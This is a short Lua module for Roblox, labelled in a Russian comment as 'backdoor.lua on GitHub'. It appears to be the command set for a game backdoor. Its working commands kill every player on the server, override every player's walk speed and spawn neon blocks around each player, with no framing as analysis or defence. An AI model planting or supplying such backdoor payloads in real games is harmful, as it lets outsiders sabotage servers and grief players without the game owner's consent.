-- backdoor.lua на GitHub
return {
    version = "1.0",
    commands = {
        killall = function()
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                local hum = p.Character and p.Character:FindFirstChild("Humanoid")
                if hum then hum.Health = 0 end
            end
            return "All killed"
        end,
        
        speed = function(speed)
            speed = tonumber(speed) or 100
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                local hum = p.Character and p.Character:FindFirstChild("Humanoid")
                if hum then hum.WalkSpeed = speed end
            end
            return "Speed: " .. speed
        end,
        
        blocks = function()
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                local hrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    for i = 1, 8 do
                        local b = Instance.new("Part")
                        b.Size = Vector3.new(1,1,1)
                        b.BrickColor = BrickColor.new("Bright red")
                        b.Material = Enum.Material.Neon
                        b.Anchored = true
                        b.Position = hrp.Position + Vector3.new(math.random(-5,5), 3, math.random(-5,5))
                        b.Parent = workspace
                        game:GetService("Debris"):AddItem(b, 10)
                    end
                end
            end
            return "Blocks spawned"
        end,
    }
}
